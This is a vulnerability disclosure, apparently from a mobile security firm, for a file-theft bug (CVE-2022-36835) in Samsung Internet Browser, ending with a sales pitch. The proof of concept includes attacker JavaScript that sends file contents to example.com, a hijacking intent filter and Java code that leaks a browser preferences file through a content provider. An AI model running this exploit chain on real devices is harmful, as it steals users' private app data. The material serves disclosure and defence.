# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Internet Browser</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.sbrowser</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.05.21</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36835">CVE-2022-36835</a> (SVE-2022-1288)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1050</td>
    </tr>
</table>

# Description

When Oversecured released the article about insecure use of file pickers in WebView, we found similar bugs in many browsers, including Chromium itself ([CVE-2022-2479](https://nvd.nist.gov/vuln/detail/CVE-2022-2479)). In the case of Samsung Internet Browser, this led to the theft of arbitrary files because the local content provider was configured to share arbitrary files.

**Proof of Concept**

Steps to reproduce the vulnerability:
1. Install the attacker app
2. Open a page with the HTML code below
3. Click on the file selection button
4. Select the attacker app
5. Observe the leaked file `/data/user/0/com.sec.android.app.sbrowser/shared_prefs/com.sec.android.app.sbrowser_preferences.xml`

HTML page of the attacker:
```html
<input type="file" accept="application/pdf" onchange="blobCallback(window.URL.createObjectURL(this.files[0]))">

<script type="text/javascript">
    function blobCallback(blobUrl) {
        theftFile(blobUrl, function(contents) {
            alert(contents);
            new Image().src = "http://example.com/?resp=" + encodeURIComponent(contents);
        });
    }

    function theftFile(url, callback) {
        var req = new XMLHttpRequest();
        req.open("GET", url, true);
        req.onload = function(e) {
        callback(req.responseText);
        }
        req.onerror = function(e) {
        callback("error");
        }
        req.send();
    }
</script>
```

Attacker app, file `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="android.intent.action.GET_CONTENT" />

        <category android:name="android.intent.category.OPENABLE" />
        <category android:name="android.intent.category.DEFAULT" />

        <data android:mimeType="application/pdf" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`
```java
Uri uri = Uri.parse("content://com.sec.android.app.sbrowser.scloud.quickaccess.sync2/data/user/0/com.sec.android.app.sbrowser/shared_prefs/com.sec.android.app.sbrowser_preferences.xml");
setResult(-1, new Intent().setData(uri));
finish();
```

## References

- [Oversecured Blog. Android security checklist: WebView. Theft of arbitrary files via file choosers](https://blog.oversecured.com/Android-security-checklist-webview/#theft-of-arbitrary-files-via-file-choosers)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.